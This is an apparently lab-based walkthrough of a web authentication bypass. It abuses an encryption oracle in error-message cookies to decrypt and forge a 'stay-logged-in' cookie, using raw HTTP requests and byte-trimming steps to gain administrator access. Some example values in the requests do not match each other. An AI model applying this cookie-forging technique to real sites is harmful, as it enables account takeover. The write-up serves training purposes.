In the `/my-account` endpoint, there is also functionality for changing the email in which we can change our email address related to our account, their request looks like the following.

```
POST /my-account/change-email HTTP/2
Host: 0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Cookie: stay-logged-in=Up6SUkm%2fm0EuyIQRjnpvg1xyRJWVjloOcsD2zeJJGIc%3d; session=ZpV6BvtqY77YoHYPizYO0Xna4rYDB9V7
Content-Length: 68
Origin: https://0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

email=wiener%40normal-user.net&csrf=GLNabsXdQk0oKNL0XghggHXjcbrC69nc
```

If we give him any random values that are not in email format they give us an error message like the following

```
Invalid email address: our-invalid-value
```

For example, I send a request like the following.

```
POST /my-account/change-email HTTP/2
Host: 0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Cookie: stay-logged-in=Up6SUkm%2fm0EuyIQRjnpvg1xyRJWVjloOcsD2zeJJGIc%3d; session=ZpV6BvtqY77YoHYPizYO0Xna4rYDB9V7
Content-Length: 68
Origin: https://0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

email=jfadksl&csrf=GLNabsXdQk0oKNL0XghggHXjcbrC69nc
```

Their response contains an error message like the following.

```
Invalid email address: jfadksl
```

One thing to note their add one new cookie value in our response that is like the following.

```
Set-Cookie: notification=YtjXLmjrhp4FClZTrHbInYy6zo6QON0361UgjIhbcyW57y%2ftORMMhxNmKDBh64iT; 
```

That also looks like URL and base64 encoded string but after decoding they didn't show any readable response like the `stay-login` cookie value.

When we substitute the above notification cookie value with our stay-login cookie value we see an interesting result like the following.

**Request**
```
GET /my-account HTTP/2
Host: 0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Cookie: notification=8U%2fF0TDQA2n1kQS7aicycbABz6GnmPe7ZFxscJLhl%2bo%3d; stay-logged-in=8U%2fF0TDQA2n1kQS7aicycbABz6GnmPe7ZFxscJLhl%2bo%3d; session=EjKWEJbRxIovxvb7MjVTmdVSvZGoNqL7
Origin: https://0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
```

**Response**
```html
.
.
<header class="notification-header">
wiener:1683116146899
</header>
.
.
```

They decrypt that string and show us the result that is readable to us. Seeing that we know they are making a `stay-login` cookie by getting our username and appending it with a timestamp like the following.

```
username:timestamp
```

If we copy the timestamp of our request and send the request that has the string `administrator:our-timestamp-here` in the following request.

**Request**
```
POST /post/comment HTTP/2
Host: 0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Cookie: stay-logged-in=cQRpSPvfgh6wfp7vQhkxPGfpzDMI0a3Lttwr4%2bycL4w%3d; session=TMYCWxclNnsNdew54bsRemHls3rtbrXE
Content-Length: 111
Origin: https://0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=SgbIfThjqph0D5BFA5GQVa5CasiEI8nF&postId=8&comment=t&name=wiener&email=administrator:1683116924082&website=
```

**Response:**
```
HTTP/2 302 Found
Location: /post?postId=8
Set-Cookie: notification=YtjXLmjrhp4FClZTrHbInYy6zo6QON0361UgjIhbcyWoVaIoSaSJC7fhl4UWBQhBv3tTE8PKhjfwyX9k4NvNOw%3d%3d; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

In the above request, we send `administrator:1683116924082` as an email in the `post/comment` request they produce an error message that is encrypted and set that as our cookie value we see now the error message is like the following.

```
Invalid email address: administrator:1683116146899
```

We see the `Invalid email address:` prefix is added in our response and we only want the `administrator:1683116146899` string, to do that we copy the notification cookie cipher text and go to burp Decoder Tab and paste that cipher text there, and now follow the following steps.

- Do a URL Decode.
- Do Base64 Decode.
- In the response of url and base64 decoded string click on the `Hex` checkmark in the burp decoder to open the result in Hex editor.
- Hold the CTRL key and select the first 23 bytes in the Hex output.
- Right-click on it and select the "Delete selected bytes" option.
- Now re-encode the result with base64 and then url encoding.

Now copy the cipher text and paste it into your request like the following.

```
GET /my-account HTTP/2
Host: 0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Cookie: notification=EjKWEJbRxIovxvb7MjVTmdVSvZGoNqL7; stay-logged-in=8U%2fF0TDQA2n1kQS7aicycbABz6GnmPe7ZFxscJLhl%2bo%3d; session=EjKWEJbRxIovxvb7MjVTmdVSvZGoNqL7
Origin: https://0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
```

In the response, we see the following different error message instead of an invalid email one.

```
Input length must be multiple of 16 when decrypting with padded cipher
```

This shows that our controlled able input is passed to the decrypt function and that causes some error. The error message indicates that a block-based encryption algorithm is used and that the input length must be a multiple of 16. 

We need to pad the "`Invalid email address:` " prefix with enough bytes so that the number of bytes we will remove is a multiple of 16. To do that we send the request again with the invalid email address `xxxxxxxxxadministrator:your-timestamp` like the following.

```
POST /post/comment HTTP/2
Host: 0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Cookie: stay-logged-in=cQRpSPvfgh6wfp7vQhkxPGfpzDMI0a3Lttwr4%2bycL4w%3d; session=TMYCWxclNnsNdew54bsRemHls3rtbrXE
Content-Length: 120
Origin: https://0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=SgbIfThjqph0D5BFA5GQVa5CasiEI8nF&postId=8&comment=t&name=wiener&email=xxxxxxxxxadministrator:1683116924082&website=
```

There we just add some padding of `x` that could be any character, we just have to make our string has enough length that we can edit it correctly. Their response is like the following.

```
HTTP/2 302 Found
Location: /post?postId=8
Set-Cookie: notification=YtjXLmjrhp4FClZTrHbIncpPOce9D3MtmARUFHX8MQ9IE1xLz6Q0rEoKGYI%2bPNiumN2dELtoX6OfopVczUP9pg%3d%3d; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

We got a new cipher text that has enough length of padding now do the previous process again but this time remove 32 bytes instead of 23.

**Steps Recap**

- Decode URL and Base64
- Click on the `Hex` button to open the Hex editor
- Delete the first 32 bytes in the hex output
- Re-encode it with base64 and then URL.

Now send the copy of the cipher and check if our value is perfect or not. Our expected value is `administrator:1683116924082`, if we get that then we are done just copy that cipher text send the GET request to `/` and delete the session cookie just add the `stay-login` with the cipher text we just made.

Doing all that correctly we should see we are logged in as an `administrator` user and we got the admin panel. Go there and delete the user carlos to solve the lab.